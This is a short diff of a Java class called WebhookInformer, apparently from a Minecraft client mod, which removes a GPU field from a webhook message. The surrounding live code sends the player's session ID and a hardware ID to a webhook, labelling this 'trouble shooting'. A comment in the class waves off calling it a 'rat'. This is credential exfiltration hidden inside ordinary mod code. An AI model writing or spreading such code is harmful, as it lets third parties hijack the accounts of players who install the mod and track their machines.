@@ -65,7 +65,6 @@ public class WebhookInformer { // If u call this class rat then pls get brain
             embed.setThumbnail("https://crafatar.com/avatars/" + MinecraftClient.getInstance().getSession().getSessionId().toString() + "?size=128&overlay");
             embed.addField("JVM", System.getProperty("java.version") + ' ' + System.getProperty("java.vendor"), false); // Trouble shooting features
             embed.addField("HWID", HWIDUtil.getHWID(), false);
-            embed.addField("GPU", GlStateManager._getString((int)7936), false); // Trouble shooting features
             embed.setColor(Color.GREEN);
             embed.setFooter(getTime(), null);
             webhook.addEmbed(embed);
